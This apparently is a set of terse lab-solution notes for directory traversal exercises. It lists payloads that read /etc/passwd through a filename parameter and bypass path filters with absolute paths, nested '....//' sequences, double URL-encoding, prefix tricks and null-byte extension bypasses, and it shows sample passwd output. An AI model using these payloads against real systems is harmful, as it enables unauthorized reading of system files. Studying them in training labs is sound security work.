# Directory traversal

## File path traversal, simple case
```
image?filename=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

## File path traversal, traversal sequences blocked with absolute path bypass
```
image?filename=/etc/passwd
```

## File path traversal, traversal sequences stripped non-recursively
```
?filename=....//....//....//etc/passwd
```

## File path traversal, traversal sequences stripped with superfluous URL-decode
```
?filename=..%252f..%252f..%252fetc/passwd
# Decodes to ..%2f..%2f..%2fetc/passwd
```

## File path traversal, validation of start of path
```
?filename=/var/www/images/../../../etc/passw
```

## File path traversal, validation of file extension with null byte bypass
```
?filename=../../../etc/passwd%00.jpg
```